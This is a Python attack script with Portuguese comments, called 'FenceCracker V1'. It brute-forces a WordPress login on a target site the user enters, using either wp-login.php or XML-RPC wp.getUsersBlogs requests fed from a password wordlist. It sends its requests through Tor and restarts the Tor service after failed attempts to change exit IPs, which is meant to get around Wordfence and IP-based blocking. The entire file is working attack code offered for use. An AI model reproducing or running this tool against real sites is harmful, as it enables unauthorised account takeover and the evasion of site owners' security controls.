# Bruteforce WordPress com WordFence;
# Necessário ter o tor instalado;
# Apenas para debian/ubuntu.
# BY: D4RKR0N

from colorama import Fore,Style
import requests
import os
import socks
import socket
import datetime 
import time

amarelo = (Fore.YELLOW)
cyan = (Fore.GREEN)
branco = (Fore.WHITE)
vermelho = (Fore.RED)
restaurar = (Style.RESET_ALL)
proxies = {
	'http':'socks5://127.0.0.1:9050',
	'https':'socks5://127.0.0.1:9050'
	}

nomeos = os.name
if(nomeos == "nt"):
	print("[X] Apenas para Linux Debian e Ubuntu(ou distros baseadas neles)!")
	exit()
else:
	os.system("clear")
	print(Style.BRIGHT,Fore.RED,'''
- FenceCracker V1 
- Aviso: Necessário seu alvo estar permitindo conexoes de exit-nodes do TOR.

               ..:::::::::..
           ..:::aad8888888baa:::..
        .::::d:?88888888888?::8b::::.
      .:::d8888:?88888888??a888888b:::.
    .:::d8888888a8888888aa8888888888b:::.
   ::::dP::::::::88888888888::::::::Yb::::
  ::::dP:::::::::Y888888888P:::::::::Yb::::
 ::::d8:::::::::::Y8888888P:::::::::::8b::::
.::::88::::::::::::Y88888P::::::::::::88::::.
:::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
:::::::Y88888888888P::|::Y88888888888P:::::::
::::::::::::::::888:::|:::888::::::::::::::::
`:::::::::::::::8888888888888b::::::::::::::'
 :::::::::::::::88888888888888::::::::::::::
  :::::::::::::d88888888888888:::::::::::::
   ::::::::::::88::88::88:::88::::::::::::
    `::::::::::88::88::88:::88::::::::::'
      `::::::::88::88::P::::88::::::::'
        `::::::88::88:::::::88::::::'
           ``:::::::::::::::::::''
                ``:::::::::'' ''')
print(Fore.WHITE)
print("By: D4RKR0N\n\nTwitter: @D4RKR0N")
print(amarelo)
print("[...] - Verificando o usuário atual...")
usuario = os.getgid()
time.sleep(2)
if(usuario == 0):
	print("{}[OK]{} - Usuário atual é ROOT.".format(cyan,amarelo))
else:
	print("{}[X]{} - Usuário atual não é root, execute o script como root.".format(vermelho,branco))
	exit()
print("[...] - Verificando se o TOR está instalado... ")
time.sleep(2)
if((os.path.isfile('/usr/bin/tor')) == 0):
	print("{}[X]{} O tor não está instalado, instale o tor e execute novamente o script.".format(vermelho,branco))
	exit()
else:
	print("{}[OK]{} - TOR está instalado.".format(cyan, amarelo))
print("[...] - Verificando se a porta 9050/TCP (TOR-SOCKS) está em modo LISTEN...")
time.sleep(2)
check = socket.socket()
host = ('127.0.0.1',9050)
try:
	check.connect(host)
	print("{}[OK]{} - Porta 9050/TCP (TOR-SOCKS) está em modo LISTEN :).".format(cyan,amarelo))
	check.close()
except:
	print("[X] - Porta 9050/TCP (TOR-SOCKS) não está em modo LISTEN.")
	exit()

site = str(input("Informe seu alvo: ").strip())
alvo = site
usuario = str(input("Informe o usuario que deseja brutar: "))
senhas = str(input("Informe a wordlist: "))
exists = os.path.isfile(senhas)
while(exists == 0):
 senhas = str(input("Informe o caminho correto da wordlist: "))
 exists = os.path.isfile(senhas)
escolhermetodo = int(input("Selecione o método em que deseja realizar o ataque: \n\n[1] - wp-login.php\n\n[2] - xmlrpc.php\n\n>> ").strip())
while (escolhermetodo != 1 and escolhermetodo != 2):
	escolhermetodo = int(input("[X] Escolha um método válido: ").strip())
if(escolhermetodo == 2):
	site = ("{}/xmlrpc.php".format(site))
	arquivolista = open(senhas,"r")
	tentativas = (arquivolista.read().split('\n'))
	horario = datetime.datetime.now().time()
	horario = str(horario)
	headers = {
	'User-Agent':'vvvvv',
	'Content-Type':'application/x-www-form-urlencoded'
	}
	horario = horario[0:8]
	print("\n{}[{}{}{}]{} - Iniciando ataque de força bruta em {} com troca dinamica de IP !\n".format(branco,cyan,horario,branco,vermelho,site))
	for senha in tentativas:
	   horario = datetime.datetime.now().time()
	   horario = str(horario)
	   horario = horario[0:8]
	   postdata = ("<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>".format(usuario,senha))
	   xml = requests.post(url=site,data=postdata,timeout=60,allow_redirects=0,headers=headers,proxies=proxies)
	   resposta_conteudo = str(xml.content)
	   resposta_codigohttp = int(xml.status_code)
	   if('<int>403' in resposta_conteudo and resposta_codigohttp == 200):
		   print('{}[{}{}{}]{} - {}:{} => FALHA'.format(branco,cyan,horario,branco,vermelho,usuario,senha))
		   os.system("service tor restart")
		   time.sleep(5)
	   elif('<int>405' in resposta_conteudo and resposta_codigohttp == 200):
		   print('{}[{}{}{}]{} - {} => XMLRPC DESATIVADO.'.format(branco,cyan,horario,branco,vermelho,site))
		   exit()
	   elif('blogid' in resposta_conteudo and resposta_codigohttp == 200):
		   print('{}[{}{}{}]{} - {}:{} => SUCESSO.'.format(branco,cyan,horario,branco,vermelho,usuario,senha))
		   exit()
	   elif(resposta_codigohttp == 403):
	       print('{}[{}{}{}]{} - {} => ACESSO BLOQUEADO AO XMLRPC.'.format(branco,cyan,horario,branco,vermelho,site))
	       exit()
	   elif(resposta_codigohttp == 406):
	       print('{}[{}{}{}]{} - {} => ModSecurity.'.format(branco,cyan,horario,branco,vermelho,site))
	       exit()
	   elif(resposta_codigohttp == 302):
	       print('{}[{}{}{}]{} - {} => Código http 302 retornado.'.format(branco,cyan,horario,branco,vermelho,site))
	       exit()
	   elif(resposta_codigohttp == 404):
	   	   print('{}[{}{}{}]{} - {} => Código http 404 retornado, verifique o path da aplicação.'.format(branco,cyan,horario,branco,vermelho,site))
	   	   exit()
	   elif(resposta_codigohttp == 503):
	   	   print('{}[{}{}{}]{} - {} Código 503 retornado, reiniciando serviço tor...'.format(branco,cyan,horario,branco,vermelho,site))
	   	   time.sleep(2)
	   	   print('{}[{}{}{}]{} - Tentando novamente com exit-nodes diferentes... '.format(branco,cyan,horario,branco,vermelho))
	   	   for tentativa in range(0,10):
	   	   	os.system("service tor restart")
	   	   	time.sleep(2)
	   	   	xml = requests.post(url=site,data=postdata,timeout=60,allow_redirects=0,headers=headers,proxies=proxies)
	   	   	resposta_conteudo = str(xml.content)
	   	   	resposta_codigohttp = int(xml.status_code)
	   	   	if('<int>403' in resposta_conteudo and resposta_codigohttp == 200):
	   	   		print('{}[{}{}{}]{} - {}:{} => FALHA'.format(branco,cyan,horario,branco,vermelho,usuario,senha))
	   	   		os.system("service tor restart")
	   	   		time.sleep(2)
	   	   		break
	   	   	elif('<int>405' in resposta_conteudo and resposta_codigohttp == 200):
	   	   		print('{}[{}{}{}]{} - {} => XMLRPC DESATIVADO.'.format(branco,cyan,horario,branco,vermelho,site))
	   	   		exit()
	   	   	elif('blogid' in resposta_conteudo and resposta_codigohttp == 200):
	   	   		print('{}[{}{}{}]{} - {}:{} => SUCESSO.'.format(branco,cyan,horario,branco,vermelho,usuario,senha))
	   	   		exit()
	   	   	elif(resposta_codigohttp == 403):
	   	   		print('{}[{}{}{}]{} - {} => ACESSO BLOQUEADO AO XMLRPC.'.format(branco,cyan,horario,branco,vermelho,site))
	   	   		exit()
	   	   	elif(resposta_codigohttp == 406):
	   	   		print('{}[{}{}{}]{} - {} => ModSecurity.'.format(branco,cyan,horario,branco,vermelho,site))
	   	   		exit()
	   	   	elif(resposta_codigohttp == 302):
	   	   		print('{}[{}{}{}]{} - {} => Código http 302 retornado.'.format(branco,cyan,horario,branco,vermelho,site))
	   	   		exit()
	   	   	elif(resposta_codigohttp == 404):
	   	   		print('{}[{}{}{}]{} - {} => Código http 404 retornado, verifique o path da aplicação.'.format(branco,cyan,horario,branco,vermelho,site))
	   	   		exit()
	   	   	elif(resposta_codigohttp == 503):
	   	   		print('{}[{}{}{}]{} - Código 503 retornado novamente ({} tentativa)'.format(branco,cyan,horario,branco,vermelho,tentativa))
	   	   	else:
	   	   		print('{}[{}{}{}]{} - Código HTTP {} retornado, erro desconhecido.'.format(branco,cyan,horario,branco,vermelho,resposta_codigohttp))           
elif(escolhermetodo == 1):
	site = ("{}/wp-login.php".format(site))
	cookies = {
	'wordpress_test_cookie': 'WP+Cookie+check'
	}
	headers = {
	'User-Agent':'vvvvv',
	'Content-Type':'application/x-www-form-urlencoded'
	}
	arquivolista = open(senhas,"r")
	tentativas = (arquivolista.read().split('\n'))
	horario = datetime.datetime.now().time()
	horario = str(horario)
	horario = horario[0:8]
	print("\n{}[{}{}{}]{} - Iniciando ataque de força bruta em {} com troca dinamica de IP !\n".format(branco,cyan,horario,branco,vermelho,site))
	for senha in tentativas:
	   horario = datetime.datetime.now().time()
	   horario = str(horario)
	   horario = horario[0:8]
	   postdata = ("log={}&pwd={}&testcookie=1&redirect_to={}/wp-admin/&wp-submit=1".format(usuario,senha,alvo))
	   wpl = requests.post(url=site,cookies=cookies,timeout=60,allow_redirects=0,headers=headers,data=postdata,proxies=proxies)
	   headerswpl = str(wpl.headers)
	   httpcodewpl = wpl.status_code
	   if(httpcodewpl == 200):
	   	print('{}[{}{}{}]{} - FALHA >> {}:{}'.format(branco,cyan,horario,branco,vermelho,usuario,senha))
	   	os.system("service tor restart")
	   	time.sleep(3)
	   elif(httpcodewpl == 302 and ("/wp-admin/'" and 'wordpress_logged_in_' in headerswpl)):
	   	print("{}[{}{}{}]{} - SUCESSO >> {}:{} ({})".format(branco,cyan,horario,branco,vermelho,usuario,senha,site))
	   	exit()
	   elif(httpcodewpl == 403):
	   	print("{}[{}{}{}]{} - {} >> Código 403 retornado, possiveis filtros/wafs...".format(branco,cyan,horario,branco,vermelho,site))
	   	exit()
	   elif(httpcodewpl == 503):
	   	print("{}[{}{}{}]{} - {} >> Código 503 retornado, restartando serviço TOR...".format(branco,cyan,horario,branco,vermelho,site))
	   	time.sleep(2)
	   	print('{}[{}{}{}]{} - Tentando novamente com exit-nodes diferentes... '.format(branco,cyan,horario,branco,vermelho))
	   	for tentativa in range(0,10):
	   		os.system("service tor restart")
	   		time.sleep(2)
	   		wpl = requests.post(url=site,cookies=cookies,timeout=60,allow_redirects=0,headers=headers,data=postdata,proxies=proxies)
	   		headerswpl = str(wpl.headers)
	   		httpcodewpl = wpl.status_code
	   		if(httpcodewpl == 200):
	   			print('{}[{}{}{}]{} - FALHA >> {}:{}'.format(branco,cyan,horario,branco,vermelho,usuario,senha))
	   			os.system("service tor restart")
	   			time.sleep(3)
	   			break
	   		elif(httpcodewpl == 503):
	   			print("{}[{}{}{}]{} - Código 503 retornado novamente ({} tentativa)...".format(branco,cyan,horario,branco,vermelho,tentativa))
	   		elif(httpcodewpl == 302 and ("/wp-admin/'" and 'wordpress_logged_in_' in headerswpl)):
	   			print("{}[{}{}{}]{} - SUCESSO >> {}:{} ({})".format(branco,cyan,horario,branco,vermelho,usuario,senha,site))
	   			exit()
	   		elif(httpcodewpl == 403):
	   			print("{}[{}{}{}]{} - {} >> Código 403 retornado, possiveis filtros/wafs...".format(branco,cyan,horario,branco,vermelho,site))
	   			exit()
	   		elif(httpcodewpl == 406):
	   			print("{}[{}{}{}]{} - {} >> ModSecurity :/.".format(branco,cyan,horario,branco,vermelho,site))
	   			exit()
	   		elif(httpcodewpl == 404):
	   			print("{}[{}{}{}]{} - {} >> ModSecurity :/.".format(branco,cyan,horario,branco,vermelho,site))
	   			exit()
	   		elif(httpcodewpl == 302):
	   			print("{}[{}{}{}]{} - {} >> Código 302 retornado, certifique-se de que o path da aplicação esteja correto.".format(branco,cyan,horario,branco,vermelho,site))
	   		else:
	   			print('{}[{}{}{}]{} - {} >> Erro desconhecido, codigo {} retornado...'.format(branco,cyan,horario,branco,vermelho,site,httpcodewpl))
	   elif(httpcodewpl == 406):
	   	print("{}[{}{}{}]{} - {} >> ModSecurity :/.".format(branco,cyan,horario,branco,vermelho,site))
	   	exit()
	   elif(httpcodewpl == 404):
	   	print("{}[{}{}{}]{} - {} >> wp-login.php não encontrado no path informado da aplicação.".format(branco,cyan,horario,branco,vermelho,site))
	   	exit()
	   elif(httpcodewpl == 302):
	   	print("{}[{}{}{}]{} - {} >> Código 302 retornado, certifique-se de que o path da aplicação esteja correto.".format(branco,cyan,horario,branco,vermelho,site)); exit()
	   else:
	   	print('{}[{}{}{}]{} - {} >> Erro desconhecido, codigo {} retornado...'.format(branco,cyan,horario,branco,vermelho,site,httpcodewpl))